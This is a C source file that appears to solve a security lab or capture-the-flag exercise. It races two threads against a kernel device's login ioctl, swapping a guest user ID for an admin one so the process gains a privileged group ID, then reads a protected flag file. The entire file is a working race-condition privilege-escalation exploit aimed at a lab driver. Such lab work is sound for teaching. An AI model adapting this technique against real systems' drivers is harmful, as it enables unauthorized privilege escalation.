//gcc -o 3.bin  3.c
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <unistd.h> // for chdir
#include <stdlib.h> // for system

#define DEVFILE		"lab73_login"

#define CMD_LOGIN       100

#define LAB73WIN_ID	    1032
#define USERID_GUEST	9999
#define PASSWD_GUEST	123456
#define USERID_ADMIN	1337
#define TARGET_FILE "/home/se/Documents/labs/lab7/attmpt1_7-3/flag.txt"
//#define TARGET_FILE "/home/lab7-3/flag.txt"
pthread_t tAttacker, tUserLogin;
int fd;

struct login_creds {
	long int userid;
	long int passwd;
};

struct login_creds login;

void PrintFlag() {
	printf("\n [*] %d\n", getegid());
	
	
    FILE *file = fopen(TARGET_FILE, "r");
    if (file != NULL) {
        char buffer[100];  // Buffer to store read content
        while (fgets(buffer, sizeof(buffer), file) != NULL) {
            printf("%s", buffer);  // Display each line to the console
        }
        fclose(file);
    } else {
        perror("Error opening file");
        
    }
	printf("\n [*] %d\n", getegid());
	return;
}

void *UserLogin(void *arg) {
//void UserLogin(int fd) {
	for(int i = 0; i <100; i++){
// 		printf("[*] UL1: Before Guest Login\n");
// 		printf("[/] UL1: UID <%d>\n", geteuid());
// 		printf("[/] UL1: GID <%d>\n", getegid());
		login.userid = USERID_GUEST;
		login.passwd = PASSWD_GUEST;

// 		printf("[//] UL: sending ioctl\n\n");
		ioctl(fd, CMD_LOGIN, &login);

// 		printf("[*] UL2: returning ioctl\n");
// 		printf("[/] UL2: UID <%d>\n", geteuid());
		printf("[/] UL2: GID <%d>\n", getegid());		
		
		
		
		if (getegid() == LAB73WIN_ID) {
            pthread_cancel(tAttacker);
            
			printf("Group Privileges have been escalated to LAB73WIN_ID!\n");
            // Cancel the GuestLogin thread

			
			printf("[//] UL: ATTEMPT PRINT\n");
			PrintFlag();
			
			printf("[//] UL: SUCCESS close and exit\n");
			pthread_exit(NULL);
			return NULL;
        } 
	}
	
	
	printf("[//] UL: close and exit\n");
    //close(fd);
    pthread_exit(NULL);
	return 0;
}


void *Attacker(void *arg) {
//void Attacker(int fd) {
	
// 	printf("[*] B4\n");
// 	usleep(50);
// 	printf("[*] A9\n");
	
	for(int i = 0; i <100; i++){
		usleep(5);
// 		printf("[*] AL: Before Admin Update\n");
// 		printf("[/] AL: UID <%d>\n", geteuid());
// 		printf("[/] AL: GID <%d>\n\n", getegid());
		login.userid = USERID_ADMIN;
		
		
// 		printf("[//] AL: sending ioctl\n\n");
		ioctl(fd, CMD_LOGIN, &login);

// 		printf("[*] AL: returning ioctl\n");
// 		printf("[/] AL: UID <%d>\n", geteuid());
 		printf("[/] AL: GID <%d>\n", getegid());

		
		if (getegid() == LAB73WIN_ID) {
            pthread_cancel(tUserLogin);
            
			printf("Group Privileges have been escalated to LAB73WIN_ID!\n");

            // Cancel the GuestLogin thread

			printf("[//] AL: SUCCESS close and exit\n");
			pthread_exit(NULL);
			return NULL;
        } 

	}
	
	
	printf("[//] AL: FAIL close and exit\n");
	pthread_exit(NULL);
	return NULL;
	
}

int main(int argc, char *argv[]) {
	
	printf("[//] ATTEMPT PRINT 1\n");
	PrintFlag();
	
	printf("[*] Open Device File\n");
	fd = open("/dev/"DEVFILE, O_RDWR);
	if (fd < 0) {
		perror("open");
		return 0;
	}
	
    pthread_create(&tUserLogin, NULL, UserLogin, NULL);
	pthread_create(&tAttacker, NULL, Attacker, NULL);
		
    

	pthread_join(tAttacker, NULL);
    pthread_join(tUserLogin, NULL);
	// Now run 'dmesg | tail' to see the login message
	close(fd);
	/*
	int a = getegid();
	if (a == LAB73WIN_ID) {
		printf("HEREHERHERHERH\n");
	}
	else{
		printf("Nope %d",a);
	}*/
	
// 	printf("[//] ATTEMPT PRINT 3\n");
// 	PrintFlag();
// 	
	return 0;

}
